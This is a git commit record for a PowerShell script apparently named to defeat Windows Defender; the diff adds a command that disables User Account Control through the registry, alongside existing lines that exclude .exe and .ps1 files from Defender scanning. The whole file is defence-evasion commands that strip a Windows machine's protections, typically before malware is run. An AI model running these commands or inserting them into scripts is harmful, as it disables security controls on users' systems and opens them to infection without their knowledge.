9fd7b80b4216b8f65287df2bfb2f5ab23b83f52d
Slyfer <49020753+SlyferToFC@users.noreply.github.com>
2021-08-22 17:41:41 +0300

    Update win10deffcker.ps1

--- win10deffcker.ps1
+++ win10deffcker.ps1
@@ -1,3 +1,4 @@
+%windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 Add-MpPreference -ExclusionExtension "exe"
 Add-MpPreference -ExclusionExtension ".exe"
 Add-MpPreference -ExclusionExtension "ps1"
